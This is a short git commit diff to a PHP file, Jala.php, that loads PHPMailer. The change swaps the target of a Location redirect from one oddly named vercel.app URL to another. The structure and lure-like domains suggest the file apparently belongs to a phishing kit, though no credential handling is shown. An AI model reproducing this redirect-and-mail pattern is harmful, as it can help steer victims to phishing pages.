8dc5585e41f85569faf6071b709aab12f9ce2f29
Jala343755 <jessicajolina410@gmail.com>
2025-08-30 00:04:53 +0500

    Update Jala.php

--- Jala.php
+++ Jala.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://more-your-selfie-rewview.vercel.app/");
+header("Location: https://page-your-open-for.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
